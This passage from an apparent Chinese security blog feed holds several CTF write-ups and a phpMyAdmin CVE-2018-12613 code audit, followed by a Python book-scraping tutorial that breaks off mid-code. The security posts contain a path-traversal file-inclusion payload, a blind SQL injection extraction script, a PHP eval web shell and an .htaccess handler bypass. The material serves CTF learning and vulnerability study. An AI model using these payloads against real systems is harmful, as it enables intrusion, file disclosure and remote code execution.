class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">public static $goto_whitelist &#x3D; array(</span><br><span class="line">        &#39; db_datadict.php&#39;,</span><br><span class="line">        &#39;db_sql.php&#39;,</span><br><span class="line">        &#39;db_events.php&#39;,</span><br><span class="line">        &#39;db_export.php&#39;,</span><br><span class="line">        &#39;db_importdocsql.php&#39;,</span><br><span class="line">        &#39;db_multi_table_query.php&#39;,</span><br><span class="line">        &#39;db_structure.php&#39;,</span><br><span class="line">        &#39;db_import.php&#39;,</span><br><span class="line">        &#39;db_operations.php&#39;,</span><br><span class="line">        &#39;db_search.php&#39;,</span><br><span class="line">        &#39;db_routines.php&#39;,</span><br><span class="line">        &#39;export.php&#39;,</span><br><span class="line">        &#39;import.php&#39;,</span><br><span class="line">        &#39;index.php&#39;,</span><br><span class="line">        &#39;pdf_pages.php&#39;,</span><br><span class="line">        &#39;pdf_schema.php&#39;,</span><br><span class="line">        &#39;server_binlog.php&#39;,</span><br><span class="line">        &#39;server_collations.php&#39;,</span><br><span class="line">        &#39;server_databases.php&#39;,</span><br><span class="line">        &#39;server_engines.php&#39;,</span><br><span class="line">        &#39;server_export.php&#39;,</span><br><span class="line">        &#39;server_import.php&#39;,</span><br><span class="line">        &#39;server_privileges.php&#39;,</span><br><span class="line">        &#39;server_sql.php&#39;,</span><br><span class="line">        &#39;server_status.php&#39;,</span><br><span class="line">        &#39;server_status_advisor.php&#39;,</span><br><span class="line">        &#39;server_status_monitor.php&#39;,</span><br><span class="line">        &#39;server_status_queries.php&#39;,</span><br><span class="line">        &#39;server_status_variables.php&#39;,</span><br><span class="line">        &#39;server_variables.php&#39;,</span><br><span class="line">        &#39;sql.php&#39;,</span><br><span class="line">        &#39;tbl_addfield.php&#39;,</span><br><span class="line">        &#39;tbl_change.php&#39;,</span><br><span class="line">        &#39;tbl_create.php&#39;,</span><br><span class="line">        &#39;tbl_import.php&#39;,</span><br><span class="line">        &#39;tbl_indexes.php&#39;,</span><br><span class="line">        &#39;tbl_sql.php&#39;,</span><br><span class="line">        &#39;tbl_export.php&#39;,</span><br><span class="line">        &#39;tbl_operations.php&#39;,</span><br><span class="line">        &#39;tbl_structure.php&#39;,</span><br><span class="line">        &#39;tbl_relation.php&#39;,</span><br><span class="line">        &#39;tbl_replace.php&#39;,</span><br><span class="line">        &#39;tbl_row_action.php&#39;,</span><br><span class="line">        &#39;tbl_select.php&#39;,</span><br><span class="line">        &#39;tbl_zoom_select.php&#39;,</span><br><span class="line">        &#39;transformation_overview.php&#39;,</span><br><span class="line">        &#39;transformation_wrapper.php&#39;,</span><br><span class="line">        &#39;user_password.php&#39;,</span><br><span class="line">    );</span><br></pre></td></tr></table></figure><p>看一下这段代码的逻辑：就是target参数问号前面的要在白名单里会返回true。<br>看一下这段代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">   $_page &#x3D; urldecode($page);</span><br><span class="line">        $_page &#x3D; mb_substr(</span><br><span class="line">            $_page,</span><br><span class="line">            0,</span><br><span class="line">            mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)</span><br><span class="line">        );</span><br><span class="line">        if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这段代码是将参数url解码一下，所以在浏览器中我们要双重url编码，因为在传入服务器之前会先进行一次url解码。<br>根据我们上面的分析很容易写出payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;your-ip:8080&#x2F;index.php?target&#x3D;db_sql.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><p>我试了不url编码?的payload，但是没有成功。<br>最后直接通过这段payload获取到了我事先写好的一个flag.txt文件内容：</p><img src="/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-phpmyadmin4-8-1%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-CVE-2018-12613/1.png" class title="Da4er">]]></content>
    
    <summary type="html">
    
      
      
        &lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;
&lt;p&gt;漏洞影响范围：phpmyadmin4.8.0 4.8.1&lt;br&gt;漏洞类型：后台任意文件包含&lt;br&gt;&lt;a href=&quot;https://files.php
      
    
    </summary>
    
    
      <category term="代码审计" scheme="https://da4er.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="代码审计" scheme="https://da4er.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>2.17 [GWCTF 2019]枯燥的抽奖&amp;我有一个数据库</title>
    <link href="https://da4er.top/2-17-GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93.html"/>
    <id>https://da4er.top/2-17-GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93.html</id>
    <published>2020-02-17T12:24:28.000Z</published>
    <updated>2020-02-17T12:28:45.241Z</updated>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script><h3 id="枯燥的抽奖"><a href="#枯燥的抽奖" class="headerlink" title="枯燥的抽奖"></a>枯燥的抽奖</h3><p>打开页面发现是给出了前十位，要猜后十位的字符串。直接抓包发现check.php源码</p><img src="/2-17-GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/1.png" class title="Da4er"><img src="/2-17-GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/2.png" class title="Da4er"><p>看到是个伪随机数问题，使用php_mt_seed进行爆破。<br>首先使用下面这个脚本，把php_mt_seed需要的获取出来：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">str1&#x3D;&#39;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;</span><br><span class="line">str2&#x3D;&#39;hvKiZfOpgL&#39; &#x2F;&#x2F;这里填上题目给的前十位</span><br><span class="line">str3 &#x3D; str1[::-1]</span><br><span class="line">length &#x3D; len(str2)</span><br><span class="line">res&#x3D;&#39;&#39;</span><br><span class="line">for i in range(len(str2)):</span><br><span class="line">    for j in range(len(str1)):</span><br><span class="line">        if str2[i] &#x3D;&#x3D; str1[j]:</span><br><span class="line">            res+&#x3D;str(j)+&#39; &#39;+str(j)+&#39; &#39;+&#39;0&#39;+&#39; &#39;+str(len(str1)-1)+&#39; &#39;</span><br><span class="line">            break</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure><img src="/2-17-GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/3.png" class title="Da4er"><p>然后用php_mt_seed爆破：</p><img src="/2-17-GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/4.png" class title="Da4er"><p>得到的随机数直接用下面的脚本进行获取全面字符串：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">mt_srand(104517409);</span><br><span class="line">$str_long1 &#x3D; </span><br><span class="line">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;</span><br><span class="line">$str &#x3D; &#39;&#39;;</span><br><span class="line">$len1 &#x3D; 20;</span><br><span class="line">for ($i &#x3D; 0; $i &lt; $len1; $i++) </span><br><span class="line">&#123;    $str .&#x3D; substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;&lt;p id&#x3D;&#39;p1&#39;&gt;&quot; . $str . &quot;&lt;&#x2F;p&gt;&quot;;</span><br></pre></td></tr></table></figure><img src="/2-17-GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/5.png" class title="Da4er"><p>将这段字符串提交得到flag。</p><img src="/2-17-GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/6.png" class title="Da4er"><hr><h3 id="我有一个数据库"><a href="#我有一个数据库" class="headerlink" title="我有一个数据库"></a>我有一个数据库</h3><p>目录扫描到phpmyadmin，接下来的就没思路了，看了别的师傅的wp，发现是phpmyadmin有一处文件包含：phpMyadmin(CVE-2018-12613)后台任意文件包含漏洞。<br>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpmyadmin&#x2F;?target&#x3D;db_datadict.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag</span><br></pre></td></tr></table></figure><img src="/2-17-GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/7.png" class title="Da4er">]]></content>
    
    <summary type="html">
    
      
      
        &lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;
&lt;h3 id=&quot;枯燥的抽奖&quot;&gt;&lt;a href=&quot;#枯燥的抽奖&quot; class=&quot;headerlink&quot; title=&quot;枯燥的抽奖&quot;&gt;&lt;/a&gt;枯燥的抽奖&lt;/h3
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://da4er.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2.16 [极客大挑战 2019]FinalSQL</title>
    <link href="https://da4er.top/2-16-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-FinalSQL.html"/>
    <id>https://da4er.top/2-16-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-FinalSQL.html</id>
    <published>2020-02-16T12:28:37.000Z</published>
    <updated>2020-02-16T12:29:07.413Z</updated>
    
    <content type="html"><![CDATA[<p>检测通过测试发现在search.php页面存在sql注入。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1^(ord(substr((select(group_concat(schema_name))from(information_schema.schema ta)),%d,1))&#x3D;%d)^1&quot;%(i,ord(j)) 获取数据库名称 </span><br><span class="line"></span><br><span class="line">1^(ord(substr((select(group_concat(table_name))from(information_schema.tables) where(table_schema)&#x3D;&#39;geek&#39;),%d,1))&#x3D;%d)^1&quot;%(i,ord(j)) 获取数据库表名 </span><br><span class="line"></span><br><span class="line">1^(ord(substr((select(group_concat(column_name))from(information_schema.column s)where(table_name&#x3D;&#39;F1naI1y&#39;)),%d,1))&#x3D;%d)^1&quot;%(i,ord(j)) 获取数据库列名</span><br></pre></td></tr></table></figure><p>先写个判断数据库名的脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import requests</span><br><span class="line">def database_len():</span><br><span class="line">    for i in range(9999):</span><br><span class="line">        url&#x3D;&#39;&#39;&#39;http:&#x2F;&#x2F;e383c445-91e1-4760-ae8f-4b889943e40c.node3.buuoj.cn&#x2F;search.php?id&#x3D;1&#39;&#39;&#39;</span><br><span class="line">        payload&#x3D;&#39;&#39;&#39;?id&#x3D;1&#39;^and length(database())&gt;%s&#39;&#39;&#39; %i</span><br><span class="line">        #print(url+payload+&#39; --+ &#39;)</span><br><span class="line">        r&#x3D;requests.get(url+payload+&#39; --+ &#39;)</span><br><span class="line">        if &#39;NO! Not this! Click others~~~&#39; in r.text:</span><br><span class="line">            print(i)</span><br><span class="line">        else:</span><br><span class="line">            print(&#39;database_length:&#39;,i)</span><br><span class="line">            break</span><br><span class="line">#database_len()</span><br><span class="line">def database_name():</span><br><span class="line">    databasename&#x3D;&#39;&#39;</span><br><span class="line">    for i in range(1,9):</span><br><span class="line">        for j in &#39;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&#39;:</span><br><span class="line">            url&#x3D;&#39;&#39;&#39;http:&#x2F;&#x2F;e383c445-91e1-4760-ae8f-4b889943e40c.node3.buuoj.cn&#x2F;search.php?id&#x3D;1&#39;&#39;&#39;</span><br><span class="line">            payload&#x3D;&#39;&#39;&#39;?id&#x3D;1&#39;^and substr(database(),%d,1) &#x3D; &#39;%s&#39; &#39;&#39;&#39; %(i,j)</span><br><span class="line">            #print(url+payload+&#39; --+ &#39;)</span><br><span class="line">            r&#x3D;requests.get(url+payload+&#39; --+ &#39;)</span><br><span class="line">            if &#39;NO! Not this! Click others~~~&#39; in r.text:</span><br><span class="line">                databasename +&#x3D; j</span><br><span class="line">                print(databasename)</span><br><span class="line">                break</span><br><span class="line">    print(&quot;database_name:&quot;,databasename.lower())</span><br><span class="line">#database_name()</span><br><span class="line">def table_length():</span><br><span class="line">        for j in range(9999):</span><br><span class="line">            url&#x3D;&#39;&#39;&#39;http:&#x2F;&#x2F;e383c445-91e1-4760-ae8f-4b889943e40c.node3.buuoj.cn&#x2F;search.php?id&#x3D;1&#39;&#39;&#39;</span><br><span class="line">            payload&#x3D;&#39;&#39;&#39;?id&#x3D;1&#39;^and length((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1))&gt;%s&#39;&#39;&#39; %j</span><br><span class="line">            r&#x3D;requests.get(url+payload+&#39; --+ &#39;)</span><br><span class="line">            if &#39;NO! Not this! Click others~~~ in r.text:</span><br><span class="line">                print(j)</span><br><span class="line">            else:</span><br><span class="line">                print(&#39;firs table length:&#39;,j)</span><br><span class="line">                break</span><br><span class="line">table_length()</span><br></pre></td></tr></table></figure><p>判断表名和字段名的可以依葫芦画瓢，来写脚本。<br>最终的脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">#然后是二分法，二分法要快很多：</span><br><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line">import re</span><br><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"> </span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;5dbbc107-a871-4d45-940a-3b2712330fee.node3.buuoj.cn&#x2F;search.php&quot;</span><br><span class="line">flag &#x3D; &#39;&#39;</span><br><span class="line">def payload(i,j):</span><br><span class="line">    # sql &#x3D; &quot;1^(ord(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))&gt;%d)^1&quot;%(i,j)                                #数据库名字          </span><br><span class="line">    # sql &#x3D; &quot;1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)&#x3D;&#39;geek&#39;),%d,1))&gt;%d)^1&quot;%(i,j)           #表名</span><br><span class="line">    # sql &#x3D; &quot;1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;F1naI1y&#39;)),%d,1))&gt;%d)^1&quot;%(i,j)        #列名</span><br><span class="line">    sql &#x3D; &quot;1^(ord(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;%d)^1&quot;%(i,j)</span><br><span class="line">    data &#x3D; &#123;&quot;id&quot;:sql&#125;</span><br><span class="line">    r &#x3D; requests.get(url,params&#x3D;data)</span><br><span class="line">    # print (r.url)</span><br><span class="line">    if &quot;Click&quot; in r.text:</span><br><span class="line">        res &#x3D; 1</span><br><span class="line">    else:</span><br><span class="line">        res &#x3D; 0</span><br><span class="line"> </span><br><span class="line">    return res</span><br><span class="line"> </span><br><span class="line">def exp():</span><br><span class="line">    global flag</span><br><span class="line">    for i in range(1,10000) :</span><br><span class="line">        print(i,&#39;:&#39;)</span><br><span class="line">        low &#x3D; 31</span><br><span class="line">        high &#x3D; 127</span><br><span class="line">        while low &lt;&#x3D; high :</span><br><span class="line">            mid &#x3D; (low + high) &#x2F;&#x2F; 2</span><br><span class="line">            res &#x3D; payload(i,mid)</span><br><span class="line">            if res :</span><br><span class="line">                low &#x3D; mid + 1</span><br><span class="line">            else :</span><br><span class="line">                high &#x3D; mid - 1</span><br><span class="line">        f &#x3D; int((low + high + 1)) &#x2F;&#x2F; 2</span><br><span class="line">        if (f &#x3D;&#x3D; 127 or f &#x3D;&#x3D; 31):</span><br><span class="line">            break</span><br><span class="line">        # print (f)</span><br><span class="line">        flag +&#x3D; chr(f)</span><br><span class="line">        print(flag)</span><br><span class="line"> </span><br><span class="line">exp()</span><br><span class="line">print(&#39;flag&#x3D;&#39;,flag)</span><br></pre></td></tr></table></figure><img src="/2-16-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-FinalSQL/1.png" class title="Da4er">]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;检测通过测试发现在search.php页面存在sql注入。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://da4er.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>[GXYCTF2019]BabyUpload</title>
    <link href="https://da4er.top/GXYCTF2019-BabyUpload.html"/>
    <id>https://da4er.top/GXYCTF2019-BabyUpload.html</id>
    <published>2020-02-16T12:27:23.000Z</published>
    <updated>2020-02-16T12:29:33.390Z</updated>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script><p>上传测试发现过滤了ph,但是可以上传.htaceess，但是上传到服务器的htaccess被删除，所以使用竞争上传的思想，同时不能使用&lt;?开头的小马。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">php小马</span><br><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt; eval($_POST[&quot;Da4er&quot;])&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">.htaccess</span><br><span class="line">&lt;FilesMatch &quot;png&quot;&gt;</span><br><span class="line">SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure><img src="/GXYCTF2019-BabyUpload/2.png" class title="Da4er"><img src="/GXYCTF2019-BabyUpload/3.png" class title="Da4er"><img src="/GXYCTF2019-BabyUpload/4.png" class title="Da4er">]]></content>
    
    <summary type="html">
    
      
      
        &lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;
&lt;p&gt;上传测试发现过滤了ph,但是可以上传.htaceess，但是上传到服务器的htaccess被删除，所以使用竞争上传的思想，同时不能使用&amp;lt;?开头的
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://da4er.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>爬虫实战_爬取豆瓣图书利用csv库存储</title>
    <link href="https://da4er.top/%E7%88%AC%E8%99%AB%E5%AE%9E%E6%88%98-%E7%88%AC%E5%8F%96%E8%B1%86%E7%93%A3%E5%9B%BE%E4%B9%A6%E5%88%A9%E7%94%A8csv%E5%BA%93%E5%AD%98%E5%82%A8.html"/>
    <id>https://da4er.top/%E7%88%AC%E8%99%AB%E5%AE%9E%E6%88%98-%E7%88%AC%E5%8F%96%E8%B1%86%E7%93%A3%E5%9B%BE%E4%B9%A6%E5%88%A9%E7%94%A8csv%E5%BA%93%E5%AD%98%E5%82%A8.html</id>
    <published>2020-02-16T11:06:31.000Z</published>
    <updated>2020-02-16T11:07:26.747Z</updated>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script><h3 id="读取csv文件"><a href="#读取csv文件" class="headerlink" title="读取csv文件"></a>读取csv文件</h3><p>通过csv.reader()和DictReader()两个函数<br>reader()函数返回一个迭代器 会包含表头 通过next函数可以跳过，但是它只能通过下标访问数据；<br>DictReader()函数返回一个字典，不包含表头，可以通过键名访问！！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import csv</span><br><span class="line"># with open(&#39;1 (2).csv&#39;,&#39;r&#39;) as fp:</span><br><span class="line">#     reader&#x3D;csv.reader(fp)</span><br><span class="line">#     # next(reader)</span><br><span class="line">#     for x in reader:</span><br><span class="line">#         print(x)</span><br><span class="line">with open(&#39;1 (2).csv&#39;,&#39;r&#39;) as fp:</span><br><span class="line">    reader&#x3D;csv.DictReader(fp)</span><br><span class="line">    for i in reader:</span><br><span class="line">        print(i[&#39;学生姓名&#39;])</span><br></pre></td></tr></table></figure><hr><h3 id="写入csv文件"><a href="#写入csv文件" class="headerlink" title="写入csv文件"></a>写入csv文件</h3><p>两个方法：<strong>一个通过writer()函数 一个通过Dictwriter()函数。</strong><br><strong>writerow() writerows()</strong><br>都是先将文件通过上面两个函数封装成对象，然后在对csv对象进行操作。<br><strong>注意Dictwriter()有两个参数一个是文件，另一个是表头(列表)，先调用writeheader()函数将表头写进去。</strong><br>这两个函数都可以写入，看给的数据：如果是元组用第一个函数；给的是字典用第二个函数。</p><hr><h3 id="项目"><a href="#项目" class="headerlink" title="项目"></a>项目</h3><p>项目说明：爬取豆瓣图片前十页，并用csv库存储下来。<br>代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import csv</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">header&#x3D;&#123;</span><br><span class="line">    &quot;User-Agent&quot;:&quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;80.0.3987.87 Safari&#x2F;537.36&quot;</span><br><span class="line">&#125;</span><br><span class="line">headers&#x3D;[&#39;书名&#39;,&#39;相关信息&#39;,&#39;评分&#39;]</span><br><span class="line">def spdier(url):</span><br><span class="line">    resp&#x3D;requests.get(url,headers&#x3D;header)</span><br><span class="line">    text&#x3D;resp.text</span><br><span class="line">    html&#x3D;BeautifulSoup(text,&quot;lxml&quot;)</span><br><span class="line">    # print(html.prettify())</span><br><span class="line">    alist&#x3D;html.find_all(&#39;a&#39;,class_&#x3D;&#39;title&#39;)</span><br><span class="line">    titles&#x3D;[]</span><br><span class="line">    for a in alist:</span><br><span class="line">        title&#x3D;list(a.stripped_strings)[0]</span><br><span class="line">        titles.append(title)</span><br><span class="line">    infolist&#x3D;html.find_all(&#39;div&#39;,class_&#x3D;&#39;desc&#39;)</span><br><span class="line">    infos&#x3D;[]</span><br><span class="line">    for info in infolist:</span><br><span class="line">        info1&#x3D;list(info.stripped_strings)[0]</span><br><span class="line">        infos.append(info1)</span><br><span class="line">    ratelist&#x3D;html.find_all(&#39;span&#39;,class_&#x3D;&#39;rating_nums&#39;)</span><br><span class="line">    rates&#x3D;[]</span><br><span class="line">    for i in ratelist:</span><br><span class="line">        rate&#x3D;list(i.stripped_strings)[0]</span><br><span class="line">        rates.append(rate)</span><br><span class="line">    books&#x3D;[]</span><br><span class="line">    for i in range(len(rates)):</span><br><span class="line">        book&#x3D;&#123;</span><br><span class="line">            &#39;书名&#39;:titles[i],</span><br><span class="line">            &#39;相关信息&#39;:infos[i],</span><br><span class="line">            &#39;评分&#39;:rates[i]</span><br><span class="line">        &#125;</span><br><span class="line">        books.append(book)</span><br><span class="line">    return books</span><br><span class="line">def csv_storage(list_books,filename):</span><br><span class="line">    with open(filename,&#39;w&#39;,encoding&#x3D;&#39;utf-8&#39;,newline&#x3D;&#39;&#39;) as fp:</span><br><span class="line">        writer&#x3D;csv.DictWriter(fp,headers)</span><br><span class="line">        writer.writeheader()</span><br><span class="line">        